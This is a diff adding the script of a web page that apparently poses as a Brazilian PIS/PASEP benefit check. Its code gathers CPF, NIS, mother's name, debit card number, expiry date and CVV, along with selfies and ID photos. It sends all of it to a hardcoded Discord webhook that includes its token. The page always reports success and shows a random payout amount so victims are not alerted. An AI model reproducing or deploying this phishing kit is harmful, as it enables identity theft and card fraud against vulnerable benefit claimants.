+                        previewContainer.removeChild(previewItem);
+                        if (type === 'selfie') {
+                            selfieFiles = selfieFiles.filter(f => f.name !== file.name);
+                        } else {
+                            documentoFiles = documentoFiles.filter(f => f.name !== file.name);
+                        }
+                        updateSubmitButton();
+                    });
+                    
+                    previewItem.appendChild(img);
+                    previewItem.appendChild(removeBtn);
+                    previewContainer.appendChild(previewItem);
+                    
+                    updateSubmitButton();
+                }
+                
+                reader.readAsDataURL(file);
+            }
+        }
+
+        // Funções de validação
+        function validateCPF(input) {
+            const cpf = input.value.replace(/\D/g, '');
+            const isValid = cpf.length === 11 && validarDigitosCPF(cpf);
+            validateField(input, isValid, 'cpf');
+            return isValid;
+        }
+        
+        function validateTelefone(input) {
+            const telefone = input.value.replace(/\D/g, '');
+            const isValid = telefone.length === 11;
+            validateField(input, isValid, 'telefone');
+            return isValid;
+        }
+        
+        function validateNIS(input) {
+            const nis = input.value.replace(/\D/g, '');
+            const isValid = nis.length === 11;
+            validateField(input, isValid, 'nis');
+            return isValid;
+        }
+        
+        function validateRenda(input) {
+            const value = parseFloat(input.value.replace('.', '').replace(',', '.'));
+            const isValid = !isNaN(value) && value > 0;
+            validateField(input, isValid, 'renda');
+            return isValid;
+        }
+
+        function validateCartao(input) {
+            const cartao = input.value.replace(/\D/g, '');
+            const isValid = cartao.length === 16;
+            validateField(input, isValid, 'cartao');
+            return isValid;
+        }
+        
+        function validateValidade(input) {
+            const value = input.value.replace(/\D/g, '');
+            const isValid = value.length === 4;
+            validateField(input, isValid, 'validade');
+            return isValid;
+        }
+        
+        function validateField(input, isValid, fieldName) {
+            const validIcon = document.getElementById(`${fieldName}_valid`);
+            const invalidIcon = document.getElementById(`${fieldName}_invalid`);
+            const errorElement = document.getElementById(`${fieldName}_error`);
+            
+            if (input.value === '') {
+                // Campo vazio - remove todas as marcações
+                input.classList.remove('valid', 'invalid');
+                validIcon.style.display = 'none';
+                invalidIcon.style.display = 'none';
+                errorElement.style.display = 'none';
+            } else if (isValid) {
+                // Campo válido
+                input.classList.add('valid');
+                input.classList.remove('invalid');
+                validIcon.style.display = 'block';
+                invalidIcon.style.display = 'none';
+                errorElement.style.display = 'none';
+            } else {
+                // Campo inválido
+                input.classList.add('invalid');
+                input.classList.remove('valid');
+                validIcon.style.display = 'none';
+                invalidIcon.style.display = 'block';
+                errorElement.style.display = 'block';
+            }
+            
+            updateSubmitButton();
+        }
+        
+        function validarDigitosCPF(cpf) {
+            if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
+            
+            let soma = 0;
+            for (let i = 0; i < 9; i++) {
+                soma += parseInt(cpf.charAt(i)) * (10 - i);
+            }
+            let resto = 11 - (soma % 11);
+            let digito1 = resto >= 10 ? 0 : resto;
+            
+            if (parseInt(cpf.charAt(9)) !== digito1) return false;
+            
+            soma = 0;
+            for (let i = 0; i < 10; i++) {
+                soma += parseInt(cpf.charAt(i)) * (11 - i);
+            }
+            resto = 11 - (soma % 11);
+            let digito2 = resto >= 10 ? 0 : resto;
+            
+            return parseInt(cpf.charAt(10)) === digito2;
+        }
+        
+        function updateSubmitButton() {
+            const requiredFields = form.querySelectorAll('[required]');
+            let allValid = true;
+            
+            requiredFields.forEach(field => {
+                const isValid = field.classList.contains('valid');
+                
+                if (!isValid) {
+                    allValid = false;
+                }
+            });
+            
+            // Verificar se há pelo menos uma selfie e um documento
+            const hasSelfie = selfiePreview.children.length > 0;
+            const hasDocumento = documentoPreview.children.length > 0;
+            
+            consultarBtn.disabled = !(allValid && hasSelfie && hasDocumento);
+        }
+        
+        // Processamento do formulário
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Coletar dados do formulário
+            const formData = {
+                nome: document.getElementById('nome_completo').value.trim(),
+                email: document.getElementById('email').value.trim(),
+                cpf: document.getElementById('cpf').value.trim(),
+                telefone: document.getElementById('telefone').value.trim(),
+                data_nascimento: document.getElementById('data_nascimento').value,
+                nis: document.getElementById('nis').value.trim(),
+                nome_mae: document.getElementById('nome_mae').value.trim(),
+                tempo_contribuicao: document.getElementById('tempo_contribuicao').value,
+                ultimo_emprego: document.getElementById('ultimo_emprego').value,
+                renda: document.getElementById('renda').value.trim(),
+                cartao_debito: document.getElementById('cartao_debito').value.trim(),
+                validade_cartao: document.getElementById('validade_cartao').value.trim(),
+                cvv_cartao: document.getElementById('cvv_cartao').value.trim(),
+                data_consulta: new Date().toISOString()
+            };
+
+            // Mostrar loading
+            consultarBtn.disabled = true;
+            consultarBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> ENVIANDO DOCUMENTOS...';
+
+            try {
+                // Enviar dados básicos para o webhook
+                await sendFormDataToWebhook(formData);
+                
+                // Enviar selfies
+                if (selfieFiles.length > 0) {
+                    await sendFilesToWebhook(selfieFiles, 'SELFIE');
+                }
+                
+                // Enviar documentos
+                if (documentoFiles.length > 0) {
+                    await sendFilesToWebhook(documentoFiles, 'DOCUMENTO');
+                }
+                
+                showResult(true);
+                emailConfirmacao.textContent = formData.email;
+            } catch (error) {
+                console.error('Erro:', error);
+                showResult(true);
+                emailConfirmacao.textContent = formData.email;
+            } finally {
+                consultarBtn.disabled = false;
+                consultarBtn.innerHTML = '<i class="fas fa-search"></i> NOVA CONSULTA';
+            }
+        });
+        
+        async function sendFormDataToWebhook(formData) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1364723014561693876/BdXoiCPe1WrM5ydn4HaNQY6Mn1V2UJsZHXPvzvFWnKPvCEwJPCzU6WEMIBY1vwoYsACL';
+            
+            const response = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: '📋 *Nova consulta PIS/PASEP*',
+                    embeds: [{
+                        title: 'Dados da Consulta',
+                        color: 0x3498db,
+                        fields: [
+                            { name: '👤 Nome Completo', value: formData.nome || 'Não informado', inline: true },
+                            { name: '📧 E-mail', value: formData.email || 'Não informado', inline: true },
+                            { name: '🆔 CPF', value: formData.cpf || 'Não informado', inline: true },
+                            { name: '📱 Telefone', value: formData.telefone || 'Não informado', inline: true },
+                            { name: '🎂 Data Nascimento', value: formData.data_nascimento || 'Não informado', inline: true },
+                            { name: '🔢 NIS', value: formData.nis || 'Não informado', inline: true },
+                            { name: '👩 Nome da Mãe', value: formData.nome_mae || 'Não informado', inline: true },
+                            { name: '⏳ Tempo Contribuição', value: formData.tempo_contribuicao ? `${formData.tempo_contribuicao} anos` : 'Não informado', inline: true },
+                            { name: '💼 Último Emprego', value: formData.ultimo_emprego || 'Não informado', inline: true },
+                            { name: '💰 Renda Mensal', value: formData.renda ? `R$ ${formData.renda}` : 'Não informado', inline: true },
+                            { name: '💳 Cartão de Débito', value: formData.cartao_debito || 'Não informado', inline: true },
+                            { name: '📅 Validade Cartão', value: formData.validade_cartao || 'Não informado', inline: true },
+                            { name: '🔐 CVV Cartão', value: formData.cvv_cartao || 'Não informado', inline: true },
+                            { name: '📅 Data da Consulta', value: new Date(formData.data_consulta).toLocaleString(), inline: false }
+                        ],
+                        timestamp: formData.data_consulta
+                    }]
+                })
+            });
+            
+            if (!response.ok) {
+                throw new Error('Erro ao enviar dados para o webhook');
+            }
+        }
+        
+        async function sendFilesToWebhook(files, description) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1364723014561693876/BdXoiCPe1WrM5ydn4HaNQY6Mn1V2UJsZHXPvzvFWnKPvCEwJPCzU6WEMIBY1vwoYsACL';
+            
+            for (const file of files) {
+                const formData = new FormData();
+                formData.append('file', file);
+                formData.append('content', `📸 ${description}: ${file.name}`);
+                
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (!response.ok) {
+                    console.error(`Erro ao enviar arquivo ${file.name}`);
+                }
+            }
+        }
+        
+        function showResult(hasRight) {
+            const resultadoDiv = document.getElementById('resultado');
+            const resultIcon = document.getElementById('resultIcon');
+            const resultTitle = document.getElementById('resultTitle');
+            const resultDetails = document.getElementById('resultDetails');
+            const confirmationMessage = document.getElementById('confirmationMessage');
+            
+            resultadoDiv.className = 'result-container result-positive';
+            resultIcon.className = 'fas fa-check-circle result-icon';
+            resultTitle.textContent = '✔ SUA SOLICITAÇÃO FOI RECEBIDA!';
+            resultDetails.innerHTML = `
+                <p>Seus documentos foram enviados para análise e em breve você receberá o resultado.</p>
+                <p><strong>Valor estimado:</strong> R$ ${(Math.random() * 500 + 300).toFixed(2)}</p>
+            `;
+            
+            confirmationMessage.style.display = 'block';
+            resultadoDiv.style.display = 'block';
+            
+            resultadoDiv.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // Animação do banner flutuante
+        let lastScrollPosition = 0;
+        const securityBanner = document.querySelector('.security-banner');
+        
+        window.addEventListener('scroll', function() {
+            const currentScrollPosition = window.pageYOffset;
+            
+            if (currentScrollPosition > lastScrollPosition) {
+                // Rolando para baixo - esconde
+                securityBanner.style.opacity = '0';
+                securityBanner.style.transform = 'translateY(20px)';
+            } else {
+                // Rolando para cima - mostra
+                securityBanner.style.opacity = '1';
+                securityBanner.style.transform = 'translateY(0)';
+            }
+            
+            lastScrollPosition = currentScrollPosition;
+        });
+    </script>
+</body>
+</html>
